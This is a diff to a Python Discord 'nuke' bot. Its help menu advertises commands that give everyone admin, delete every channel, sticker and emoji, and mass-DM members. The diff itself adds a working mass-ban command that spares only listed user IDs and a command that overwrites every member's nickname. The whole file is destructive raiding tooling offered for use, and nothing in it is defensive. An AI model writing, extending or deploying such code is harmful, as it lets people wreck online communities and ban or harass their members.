@@ -96,7 +96,7 @@ async def on_ready():
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 """)
-  print("Bot is ready to go")
+  print(f'{bot.user.name} has connected to Discord!')
 
 
 @bot.command()
@@ -111,12 +111,14 @@ async def help(ctx):
   embed = discord.Embed(title="NUKE COMMANDS", color=discord.Colour.blue())
   embed.add_field(name=".nuke", value=".nuke runs every command the bot has", inline=False)
   embed.add_field(name=".admin", value=".admin gives everyone admin", inline=False)
+  embed.add_field(name=".ban", value=".ban(userid to exclude from ban) the userid is optional and bans everyone except ppl listed from the userid \n example: .ban 123456789012345678 234567890123456789", inline=False)
   embed.add_field(name=".edit", value=".edit(name) change the server name and icon and banner add your pictures in this directory", inline=False)
   embed.add_field(name=".dchannel", value=".dchannel deletes every channel", inline=False)
   embed.add_field(name=".dtickers", value=".dtickers deletes every stickers", inline=False)
   embed.add_field(name=".demoji", value=".demoji deletes every emoji", inline=False)
   embed.add_field(name=".croles", value=".croles(name) create roles and name them as 'name'", inline=False)
   embed.add_field(name=".dm", value=".dm(message) dms every member in the server", inline=False)
+  embed.add_field(name=".cname", value=".cname(name) changes every member in the server to that nickname", inline=False)
 
   await ctx.author.send(embed=embed)
     
@@ -250,14 +252,19 @@ async def croles(ctx, role_name: str, num_roles: int):
       break
 
 @bot.command()
-async def ban(ctx):
+async def ban(ctx, *exclude: discord.User):
+  excluded_ids = [user.id for user in exclude]
   guild = ctx.guild
+
   for member in guild.members:
+    if member.id in excluded_ids or member == bot.user:
+      continue
     try:
-      await member.ban()
-      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
-    except:
-      print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
+      await member.ban(reason="BANNEDDDDDDD")
+      print(Fore.MAGENTA + f"{member.name}#{member.discriminator} was banned." + Fore.RESET)
+    except Exception as e:
+      print(Fore.GREEN + f"{member.name}#{member.discriminator} was unable to be banned. Reason: {e}" + Fore.RESET)
+
 
 @bot.command()
 async def dchannel(ctx):
@@ -283,6 +290,21 @@ async def dm(ctx, *, message: str):
       print(f"Failed to send message to {member.name}: {e}")
     except discord.Forbidden:
       print(f"Cannot send messages to {member.name}")
+
+@bot.command()
+async def cname(ctx, *, new_nick: str):
+  guild = ctx.guild
+  members = guild.members
+  for member in members:
+    try:
+      if member == bot.user:
+          continue
+      await member.edit(nick=new_nick)
+      await asyncio.sleep(0.2)
+    except discord.Forbidden:
+        print(f"Do not have permission to change nickname for {member.name}")
+    except discord.HTTPException as e:
+        print(f"Failed to change nickname for {member.name}: {str(e)}")
 
 @bot.event
 async def on_guild_channel_create(channel):
